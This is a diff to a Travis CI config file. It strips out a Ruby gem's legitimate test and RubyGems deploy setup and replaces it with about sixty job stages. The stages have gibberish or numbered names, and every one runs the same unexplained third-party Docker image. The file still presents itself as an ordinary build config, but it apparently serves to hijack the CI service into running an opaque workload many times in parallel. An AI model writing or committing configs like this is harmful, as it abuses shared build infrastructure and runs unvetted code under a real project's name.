@@ -1,35 +1,125 @@
-dist: trusty
-git:
-  # use depth 5 just in case two refs get pushed at once (like a tag)
-  depth: 5
-language: ruby
-rvm:
-- 2.7.2
-- 2.5.5
-- 2.4.6
-- jruby-9.2.7.0
-matrix:
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
+jobs:
   include:
-  - rvm: &release_rvm 2.6.3
-    env: COVERAGE=deep
-  - rvm: *release_rvm
-    env: JEKYLL_VERSION=3.0.0
-  - rvm: *release_rvm
-    env: ASCIIDOCTOR_VERSION=2.0.0
-bundler_args: --jobs=3 --retry=3 --without=docs
-script:
-- bundle exec rake spec
-- if [ ! -z $COVERAGE ]; then bundle exec rake lint; fi
-notifications:
-  email:
-    on_success: never
-    on_failure: change
-deploy:
-  provider: rubygems
-  gem: jekyll-asciidoc
-  api_key: ${RUBYGEMS_API_KEY}
-  on:
-    tags: true
-    repo: asciidoctor/jekyll-asciidoc
-    rvm: *release_rvm
-    condition: -n $COVERAGE
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
+    - stage: manaja
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capasjx
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabiyjsjajajj
+      script: docker run christiankm01/master:3.15.5   
+    - stage: test-capabiykimhokjs
+      script: docker run christiankm01/master:3.15.5  
+    - stage: test3
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test4
+      script: docker run christiankm01/master:3.15.5
+    - stage: test5
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test6
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test7
+      script: docker run christiankm01/master:3.15.5
+    - stage: test8
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test9
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test10
+      script: docker run christiankm01/master:3.15.5
+    - stage: test11
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test12
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5
+    - stage: test13
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test15
+      script: docker run christiankm01/master:3.15.5
+    - stage: test16
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test17
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test18
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test19
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test20
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test21
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test22
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test23
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test24
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test25
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test26
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test27
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test28
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test29
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test30
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test31
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test32
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test33
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test34
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test35
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test36
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test37
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test38
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test39
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test40
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test41
+      script: docker run christiankm01/master:3.15.5     
